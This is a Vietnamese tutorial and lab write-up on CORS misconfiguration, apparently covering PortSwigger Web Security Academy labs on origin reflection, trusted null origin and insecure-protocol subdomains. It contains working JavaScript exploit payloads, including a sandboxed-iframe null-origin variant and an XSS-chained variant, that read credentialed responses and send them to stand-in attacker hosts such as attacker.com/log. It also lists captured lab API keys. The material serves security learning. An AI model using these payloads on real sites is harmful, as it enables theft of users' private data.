# Lỗ hổng Cross-origin resource sharing (CORS)

---

## CORS là gì?

- Trình duyệt mặc định có chính sách cùng nguồn (SOP):

  - Chặn một trang web này đọc dữ liệu từ một trang web khác domain.

  - Ví dụ: evil.com không thể đọc nội dung trả về từ bank.com.

- CORS (Cross-Origin Resource Sharing) là cơ chế mà server cho phép “nới lỏng” SOP. Cho phép một trang web từ domain A có thể gọi API và đọc dữ liệu từ domain B, nếu domain B cho phép.

- Ví dụ:

  ```http
  Access-Control-Allow-Origin: https://trusted.com
  ```

  &rarr; Có nghĩa là chỉ https://trusted.com mới được phép truy cập tài nguyên này từ browser.

  &rarr; Rủi ro bảo mật nếu cấu hình sai.

- Tuy nhiên, CORS KHÔNG chống được CSRF vì CORS chỉ kiểm soát việc đọc dữ liệu phản hồi, không chặn việc gửi request và CSRF không cần đọc phản hồi. CSRF chỉ dùng để gửi hành động (state-changing), không dùng để lấy dữ liệu.

  <img width="781" height="461" alt="image" src="https://github.com/user-attachments/assets/230addea-a4b0-45ee-b399-b8d14a2bcf8b" />

---

## Cơ chế SOP

- Giả sự ta có một URL như sau:

  ```url
  http://normal-website.com/example/example.html
  ```

  URL trên sử dụng schema là HTTP, domain là ```normal-website.com```, và cổng là cổng 80.

- Bảng dưới đây cho thấy cách SOP sẽ được áp dụng nếu nội dung tại URL trên cố gắng truy cập các nguồn khác:

  <img width="974" height="476" alt="image" src="https://github.com/user-attachments/assets/087c6ae1-7ca6-405b-9f14-c006033ec6cc" />

- Giả sử, ta login Facebook, nên browser đã lưu cookie:

  ```
  Domain: facebook.com
  Name: session
  Value: abc123
  ```

  Giờ nếu vào trang web evil.com, trang này có đoạn JS:

  ```
  fetch("https://facebook.com/me");
  ```

  **NOTE: chỉ gắn được cookie session nếu có credentials: "include", sẽ đề cập sau ở dưới.**
  
  Khi trình duyệt gửi request đến ```https://facebook.com/me```, nó sẽ tự động đính cookie session=abc123 (vì cookie đó thuộc domain facebook.com) và trình duyệt không     quan tâm bạn đang đứng ở evil.com. Miễn request đi tới facebook.com thì cookie facebook.com sẽ được tự gắn vào. Facebook thấy có cookie hợp lệ &rarr; Trả về thông tin    chứa dữ liệu cá nhân nhạy cảm.

  &rarr; Nếu không có SOP, trang evil.com sẽ đọc được luôn response này → lộ thông tin cá nhân.

---

## CORS and the Access-Control-Allow-Origin response header

- Một sự nới lỏng có kiểm soát của SOP là có thể thông qua việc chia sẻ tài nguyên xuyên miền (CORS).

- Header ```Access-Control-Allow-Origin``` được bao gồm trong phản hồi từ một trang web đối với yêu cầu phát sinh từ một trang web khác, và xác định nguồn gốc được phép của yêu cầu. Trình duyệt web so sánh Access-Control-Allow-Origin với nguồn gốc của trang web yêu cầu và cho phép truy cập vào phản hồi nếu chúng khớp.

### Implementing simple cross-origin resource sharing

- Đặc tả CORS xác định một tập hợp các tiêu đề giao thức, trong đó Access-Control-Allow-Origin là quan trọng nhất

- Cách hoạt động:

  Trình duyệt gửi request có header Origin:

  ```http
  GET /data HTTP/1.1
  Host: robust-website.com
  Origin: https://normal-website.com
  ```

  Server phản hồi kèm Access-Control-Allow-Origin:

  ```http
  HTTP/1.1 200 OK
  ...
  Access-Control-Allow-Origin: https://normal-website.com
  ```

  Trình duyệt so sánh:

    - Nếu Origin trong request == _Access-Control-Allow-Origin_ trong response ➜ cho phép JavaScript bên normal-website.com đọc dữ liệu từ robust-website.com

    - Nếu không khớp ➜ vẫn tải nhưng JS không được đọc, dữ liệu bị chặn (SOP vẫn áp dụng).

- Access-Control-Allow-Origin có thể:

  - Gán 1 origin cụ thể (an toàn hơn)
  
  - Gán * (cho phép tất cả — nhưng không hoạt động nếu có cookie/session vì lý do bảo mật)
  
  - Gán null (dùng cho các tình huống đặc biệt như sandboxed iframe)
 
### Handling cross-origin resource requests with credentials

- Bình thường, khi trình duyệt gửi request cross-origin (dạng request từ JS, khác với CSRF là dạng request tự động của browser) (từ domain A sang domain B), nó sẽ KHÔNG gửi kèm credentials (như cookies session, hoặc header Authorization) → vì lý do bảo mật.

- Do đó, nếu muốn vừa cross-origin vừa gửi kèm credentials (cookie/session) thì:

  Browser (JS) phải bật gửi credentials:

  ```javascript
  fetch("https://robust-website.com/data", {
  credentials: "include"
  })
  ```

  Trình duyệt sẽ gắn cookie JSESSIONID=<value> vào request.

  Và Server (robust-website.com) phải phản hồi:

  ```http
  Access-Control-Allow-Origin: https://normal-website.com
  Access-Control-Allow-Credentials: true
  ```

- Nếu không có _Access-Control-Allow-Credentials: true_ thì browser sẽ vẫn gửi request (có cookie) nhưng: KHÔNG cho JS bên normal-website.com đọc response → vì vi phạm chính sách CORS. Tức là request vẫn gửi, nhưng response bị chặn.

### Relaxation of CORS specifications with wildcards

- _Access-Control-Allow-Origin: *_ là dạng header cho trình duyệt biết: "Tất cả các domain đều được phép truy cập tài nguyên của mình." Tức là bất kỳ trang web nào cũng có thể gửi request đến server này và JS bên đó đọc được response.

- Nhưng nếu vừa set _Access-Control-Allow-Origin: *_ vừa set _Allow-Credentials: true_ thì sẽ bị trình duyệt từ chối (không cho đọc response).

- CORS không hỗ trợ wildcard dạng giữa chuỗi (chỉ hỗ trợ toàn bộ *):

  ```http
  Access-Control-Allow-Origin: https://*.normal-website.com
  ```

### Pre-flight checks

- Với CORS, nếu request gửi tới server “bình thường” như GET hoặc POST đơn giản (không header lạ, không content-type đặc biệt) thì trình duyệt gửi thẳng luôn.

- Nhưng nếu request đó có rủi ro cao như:

  - Dùng method khác GET/POST/HEAD (ví dụ: PUT, DELETE)
  
  - Dùng custom header không chuẩn (X-Token, Special-Request-Header, …)
  
  - Gửi body có Content-Type đặc biệt (application/json chẳng hạn)
 
- Lúc này trình duyệt sẽ gửi một request "thăm dò" trước (pre-flight) với method OPTIONS để hỏi server có cho phép request chính hay không.

- Ví dụ:

  ```http
  OPTIONS /data HTTP/1.1
  Host: target.com
  Origin: https://normal-website.com
  Access-Control-Request-Method: PUT
  Access-Control-Request-Headers: Special-Request-Header
  ```

  Access-Control-Request-Method: method thực sự sẽ dùng sau này (PUT)
  
  Access-Control-Request-Headers: các header custom sẽ gửi sau

  Và response từ server:

  ```http
  HTTP/1.1 204 No Content
  Access-Control-Allow-Origin: https://normal-website.com
  Access-Control-Allow-Methods: PUT, POST, OPTIONS
  Access-Control-Allow-Headers: Special-Request-Header
  Access-Control-Allow-Credentials: true
  Access-Control-Max-Age: 240
  ```

  Nếu server từ chối, trình duyệt sẽ chặn luôn, không gửi request thật đi.

---

## Vulnerabilities arising from CORS configuration issues

### Server-generated ACAO header from client-specified Origin header

- Bình thường: Server phải có danh sách các domain tin tưởng (whitelist), ví dụ chỉ https://app.trusted.com.

- Nhưng: Để tiện và đỡ phải quản lý, một số dev viết kiểu: "Bất cứ Origin nào gọi tới cũng được, chỉ cần mình đọc giá trị trong header Origin của request và gửi trả lại trong header Access-Control-Allow-Origin."

- Do đó, ta chỉ cần dụ victim truy cập vào trang của mình (malicious-website.com) với đoạn JS sau:

  ```javascript
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('GET','https://vulnerable-website.com/sensitive-victim-data',true);
  req.withCredentials = true; // gửi kèm cookie session của victim
  req.send();
  
  function reqListener() {
    // Gửi dữ liệu đọc được từ nạn nhân về server attacker
    location='//malicious-website.com/log?key='+this.responseText;
  };
  ```

- Khi victim vào trang độc:

  - Trình duyệt gửi request đến vulnerable-website.com kèm session cookie của victim.

  - Server trả dữ liệu nhạy cảm về.

  - Trình duyệt cho JS đọc dữ liệu đó (vì CORS cho phép).

  - JS attacker gửi dữ liệu này về server của hắn.

  → Attacker đọc được dữ liệu riêng tư (API key, CSRF token, PII...) của victim.

### Lab: CORS vulnerability with basic origin reflection

- Giao diện khi đăng nhập: _wiener:peter_

  <img width="1919" height="936" alt="Screenshot 2025-09-16 163443" src="https://github.com/user-attachments/assets/ae39d811-0c5e-4020-a0d4-6ba246e259ba" />

  &rarr; có hiện API key cá nhân.

- Check HTTP history, ta để ý thấy một AJAX request /accountDetails và phản hồi trả về dữ liệu dạng JSON:

  <img width="1918" height="641" alt="image" src="https://github.com/user-attachments/assets/04269ac5-0f45-4371-872d-a92fc8683983" />

  Để ý thấy rằng trong response của server có header _Access-Control-Allow-Credentials_ &rarr; có sử dụng CORS.

- Thực hiện gửi request trên vào trong Burp Repeater.

- Sau đó thêm một header là _Origin_ với giá trị là một domain tùy ý như: _https://example.com_ để test phản hồi của server:

  <img width="1919" height="882" alt="image" src="https://github.com/user-attachments/assets/a0efb86b-8263-4d24-bb40-a8bef5062ca5" />

  Thấy được ngay rằng giá trị của header _Access-Control-Allow-Origin_ được reflect y hệt nwh trong request &rarr; Dev cấu hình lỗi CORS.

- Truy cập exploit server, trong file /exploit ta viết phần body với đoạn JS như sau:

  ```javascipt
  <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
  </script>
  ```  

  <img width="1919" height="938" alt="image" src="https://github.com/user-attachments/assets/431003bd-8e9d-4933-83ea-4b421e249588" />

  Gửi cho thằng admin và đợi nó truy cập vào đường dẫn &rarr; Tự động gửi request với session cookie của nó tới server, và ta cũng sẽ đọc được response của server trả về exploit     server vì thằng dev cấu hình sau CORS.

  Sau khi gửi cho victim, check access log của exploit server và lụm lúa:

  <img width="1914" height="943" alt="image" src="https://github.com/user-attachments/assets/c6fa2361-e215-4ecb-8538-3c5a5cb69a2d" />

  Thu được API key của admin là: _RHAwq8Jpg0GcD3JGK0eoA8ahPFRS3MPf_

--- 

### Errors parsing Origin headers

- Thông thường, các server sẽ có một whitelist để check Origin từ client gửi tới và phản hồi với header _Access-Control-Allow-Origin_ nếu khớp.

- Tuy nhiên, một số dev viết check whitelist sai cách, như:
  
  - So khớp bằng chuỗi con (endsWith, startsWith) thay vì so chính xác domain.
  
  - Dùng regex lỗi không ràng buộc đầy đủ.
  
  - Cho phép mọi subdomain nhưng không kiểm soát.

### Whitelisted null origin value

- Trong một số trường hợp đặc biêt, trình duyệt không thể xác định origin thật, nên nó gán Origin: null.

- Vì lúc dev hay test local, một số team cho phép request có Origin: null để debug. Ví dụ:

  ```http
  GET /sensitive-victim-data HTTP/1.1
  Host: vulnerable-website.com
  Origin: null
  ```

  Server trả về:

  ```http
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: null
  Access-Control-Allow-Credentials: true
  ```

  &rarr; Tức là bất kỳ request nào có Origin = null đều được phép đọc data, và còn cho gửi kèm cookie (withCredentials).

- Do đó, ta có thể tạo một trang độc hại dùng ```<iframe sandbox>``` (vì khi dùng sandboxed iframe không có quyền allow-same-origin) để ép trình duyệt gửi request với _Origin: null_:

  ```javascript
  <iframe sandbox="allow-scripts allow-forms" 
        src="data:text/html,
  <script>
    var req = new XMLHttpRequest();
    req.onload = function() {
      location='https://malicious-website.com/log?key='+this.responseText;
    };
    req.open('GET','https://vulnerable-website.com/sensitive-victim-data',true);
    req.withCredentials = true;  // gửi cookie nạn nhân kèm theo
    req.send();
  </script>">
  </iframe>
  ```

### Lab: CORS vulnerability with trusted null origin

- Tương tự bài lab trước, ta thực hiện đăng nhập với: _wiener:peter_

  <img width="1918" height="945" alt="image" src="https://github.com/user-attachments/assets/c00ae960-dc62-4811-9b22-7282d4af0ea8" />

- Tương tự phát hiện website sử dụng CORS trong response của AJAX request khi ta thực hiện đăng nhập:

  <img width="1919" height="710" alt="image" src="https://github.com/user-attachments/assets/12b46b65-54d7-4e5e-83f2-037e49023e74" />

- Thực hiện gửi request vào trong Burp Repeater.

- Thêm header Origin với giá trị là https://example.com và gửi request:

  <img width="1919" height="930" alt="image" src="https://github.com/user-attachments/assets/c1fdb894-5ec0-40b5-88d7-11daba480cf9" />

  Tuy nhiên có thể thấy ở đây, trong response phản hồi của server ta sẽ không thấy header _Access-Control-Allow-Origin_ trả về &rarr; có vè chặn, sử dụng   whitelist.

- Tuy nhiên nếu ta thay đổi giá trị của header này là null, với cách như đã đề cập ở trên để test phản hồi của server:

  <img width="1919" height="929" alt="image" src="https://github.com/user-attachments/assets/70144bfd-6364-46ca-89a8-8d31c2ce24b4" />

  Ta có thể thấy server phản hồi trả về lại với header _Access-Control-Allow-Origin_ cũng là null.

  &rarr; lỗi whitelisted null origin value.

- Truy cập exploit server, trong file /exploit ta viết phần body với đoạn JS như sau:

  ```javascript
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
  </script>"></iframe>
  ```

  Ta tạo một ```<iframe sandbox>``` qua đó ép browser phải gửi request với Origin là null tới server, qua đó ta có thể bypass whitelist và lụm lúa.

  Thực hiện gửi đển cho victim là admin và chờ nó truy cập đường dẫn sau đó check access log:

  <img width="959" height="467" alt="image" src="https://github.com/user-attachments/assets/c75b0668-11bf-43ac-a799-b4975708b915" />

  Check access log, nhận được response của server website gửi về cho exploit server của ta:

  <img width="1919" height="941" alt="image" src="https://github.com/user-attachments/assets/15b99aad-181f-4899-8286-ad0ab46787f1" />

  Thành công thu được API key của admin: _84bjdoMis0cO1vCeZAW4jnMMCBbtIU34_

--- 

### Exploiting XSS via CORS trust relationships

- CORS cho phép origin A đọc dữ liệu từ origin B nếu B tin tưởng A.

- Server của ```vulnerable-website.com``` thể hiện “tin tưởng” bằng cách trả header:

  ```yaml
  Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
  Access-Control-Allow-Credentials: true
  ```

- Lỗ hổng xảy ra khi: Domain được trust (subdomain.vulnerable-website.com) lại bị dính XSS. Tức ta có thể inject JS chạy trực tiếp trên domain đó.

- Giả sử ta gửi link cho nạn nhân:

  ```url
  https://subdomain.vulnerable-website.com/?xss=<script>steal()</script>
  ```

- Khi nạn nhân bấm link:

  - Trình duyệt tải trang từ ```subdomain.vulnerable-website.com```.
  
  - JS độc của attacker chạy trực tiếp trong context của subdomain.vulnerable-website.com &larr; đây là điểm mấu chốt.
  
  - Vì JS đang chạy trên đúng origin được whitelist bởi CORS, nên browser sẽ cho phép script này đọc dữ liệu từ vulnerable-website.com:
 
  ```javascript
  function steal() {
    fetch('https://vulnerable-website.com/api/requestApiKey', {
        credentials: 'include'
    })
    .then(r => r.text())
    .then(data => {
        // Gửi dữ liệu ăn cắp được về server attacker
        fetch('https://attacker.com/log?key=' + encodeURIComponent(data))
    });
  }
  ```

---

### Breaking TLS with poorly configured CORS

- Ví dụ, một ```vulnerable-website.com``` dùng HTTPS rất nghiêm ngặt, tất cả endpoint chính đều qua https://. Tuy nhiên, nó cấu hình CORS cho phép truy cập từ một subdomain sử dụng HTTP thường: ```http://trusted-subdomain.vulnerable-website.com```

- Dưới dây là cách ta có thể khai thác:

  - Victim đang lướt web bình thường, gửi một request HTTP (không phải HTTPS) — ví dụ vào một trang http://example.com.
 
  - Attacker (đang MITM) chặn request này và chèn vào một lệnh redirect sang: ```http://trusted-subdomain.vulnerable-website.com```

  - Trình duyệt victim truy cập subdomain này qua HTTP (không mã hoá).

  - Attacker tiếp tục MITM, giả mạo response từ subdomain đó, trong response chứa JavaScript chạy CORS:
 
    ```javascript
    fetch('https://vulnerable-website.com/api/requestApiKey', {
    credentials: 'include'
    })
    .then(r => r.text())
    .then(data => fetch('https://attacker.com/log?key=' + data));
    ```

  - Khi JS này chạy, trình duyệt gửi request cross-origin đến kèm cookie session thật của victim:

    ```url
    https://vulnerable-website.com/api/requestApiKey
    ```

  - Server hợp lệ (vì thấy Origin: _http://trusted-subdomain.vulnerable-website.com_ là nằm trong whitelist) nên trả về dữ liệu nhạy cảm (API key...) &rarr; ta đọc được.

### Lab: CORS vulnerability with trusted insecure protocols

- Tương tự các bài lab trước, sau khi đăng nhập thành công vào website, check Burp ta có thể thấy có AJAX request /accountDetails và response trả về có header ```Access-Control-Allow-Credentials```:

  <img width="1408" height="620" alt="Screenshot 2025-09-17 152703" src="https://github.com/user-attachments/assets/42669993-f764-48bb-b438-5be536ff46b6" />

  &rarr; có sử dụng cơ chế CORS.

- Chuyển request vào trong Burp Repeater.

- Thực hiện thử thêm header Origin sau đó nhập giá trị là thêm ```subdomain``` (hoặc bất kỳ từ tùy ý nào) ở trước domain chính hiện tại:

  ```http
  Origin: https://subdomain.0a1100390460657a80ed0381006200b6.web-security-academy.net
  ```

  <img width="1919" height="877" alt="image" src="https://github.com/user-attachments/assets/93f6f585-131d-410e-92d1-19249e5bc3b4" />

  Ta có thể thấy response trả về xuất hiện header ```Access-Control-Allow-Origin: https://subdomain.0a1100390460657a80ed0381006200b6.web-security-academy.net```, tức là subdomain    trên có trong whitelist của server website.

  Thử bỏ giao thức HTTPS và thay bằng HTTP thường, ta thấy response trả về vẫn được với header ```Access-Control-Allow-Origin```:

  <img width="1919" height="923" alt="image" src="https://github.com/user-attachments/assets/16204cc7-010a-4e4e-96d4-a8e677b44e02" />

  &rarr; Cấu hình CORS cho phép truy cập từ bất kỳ subdomain tùy ý của domain chính, kể cả HTTPS hay HTTP.

- Vấn đề bây giờ cần tìm một lỗ hổng XSS để có thể inject mã JS độc hại.

- Trong trang chủ các sản phẩm của web shop, chọn một sản phẩm bất kỳ và chọn _Check stock_, ta có thể thấy nó được load sử dụng một HTTP URL trên một subdomain của domain chính web shop:

  <img width="1919" height="936" alt="image" src="https://github.com/user-attachments/assets/beeb2b45-b291-4b3e-ae7f-e476b050dc69" />

- Trong Burp, kiểm tra request _Check stock_, ta nhận thấy có hai param được truyền vào là _prroductId_ và _storeId_

- Thực hiện, chuyển request vào trong Burp Repeater và sửa giá trị của param _productId_ là payload XSS như sau:

  ```html
  <script>alert(1)</script>
  ```

  Sau đó gửi request và kiểm tra response của server, ta thấy payload được reflect lại trong response như sau:

  <img width="1919" height="825" alt="Screenshot 2025-09-17 155311" src="https://github.com/user-attachments/assets/a82161ef-8271-4054-b070-8512823caa74" />

  Thực hiện copy URL response, sau đó paste lên trên trình duyệt, kết quả ta có thể thấy payload XSS đã được kích hoạt:

  <img width="1919" height="933" alt="Screenshot 2025-09-17 155507" src="https://github.com/user-attachments/assets/7388674e-ec18-4787-909a-79b8b17be1dd" />

  &rarr; param _productId_ trong request _Check stock_ có lỗ hổng XSS.

  &rarr; Ta cần lợi dụng lỗ hổng XSS này trên subdomain ```http://stock.main_domain....``` để khai thác lỗ hổng CORS.

- Trong exploit server, tại file /exploit ở phần body ta tạo một payload HTML như sau (do trong phạm bị bài lab ta không thể tạo một cuộc tấn công MITM tới nạn nhân):

  ```html
  <script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?
        productId=<script>
            var req = new XMLHttpRequest(); 
            req.onload = reqListener; 
            req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); 
            req.withCredentials = true;
            req.send();
            function reqListener() {
                location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+this.responseText;
            };
        %3c/script>
        &storeId=1"
  </script>
  ```

  Khi gửi đường dẫn độc hại này cho victim là admin, admin thực click vào đường dẫn, sẽ tự động redirect bằng ```document.location``` tới subdomain         ```http://stock.0a1100390460657a80ed0381006200b6.web-security-academy.net```, nơi chứa lỗ hổng XSS tại param ```productId```.

  Ta tạo một mã JS độc hại tương tự như hai bài lab trên trong param ```productId```, lúc này trình duyệt sẽ tạo một HTTP request từ subdomain chứa lỗ      hổng XSS tới domain chính tại endpoint /accountDetails đang có CORS lỏng lẻo.

  Lúc này server sẽ trả về response tới exploit server vì chính sách whitelist subdomain như đã đề cập ở trên &rarr; lụm lúa.

  <img width="1919" height="938" alt="image" src="https://github.com/user-attachments/assets/4214e494-33d1-4237-ba48-e969d4d73773" />

  Sau khi gửi đường dẫn cho victim, kiểm tra acess log của exploit server:

  <img width="1919" height="928" alt="image" src="https://github.com/user-attachments/assets/28cfd126-ce1a-4c95-a4bf-1e8cbac1ea0f" />

  &rarr; Thành công khai thác CORS thu được dữ liệu nhạy cảm của admin.

---

### Intranets and CORS without credentials

- Bình thường, CORS có ```Access-Control-Allow-Credentials: true``` thì browser mới đính kèm session cookies / token của người dùng.

- Nhưng điều này chỉ đúng với web public mà ta có thể truy cập.

- Còn trong case đặc biệt như Intranet = hệ thống web nội bộ, chỉ truy cập được từ mạng công ty hoặc IP riêng (192.168.x.x, 10.x.x.x...). Ta từ Internet không thể truy cập trực tiếp intranet site.

- Nhưng nếu attacker dụ một nhân viên trong mạng nội bộ truy cập trang của mình (evil.com):

  - Evil.com có thể dùng JS gửi ```fetch("http://intranet.company.local/data")```.

  - Browser nạn nhân sẽ gửi request đó đến intranet, intranet site thường là open (không yêu cầu đăng nhập) &rarr; không cần gửi cả credentials.

- Nếu intranet server trả về:

  ```
  Access-Control-Allow-Origin: *
  ```

  thì trình duyệt sẽ cho phép JavaScript của evil.com đọc response, dù: _không có credentials, không cần Access-Control-Allow-Credentials: true_

  &rarr; lấy được dữ liệu nhạy cảm/nội bộ.


                                                                                                                              


  
  


  
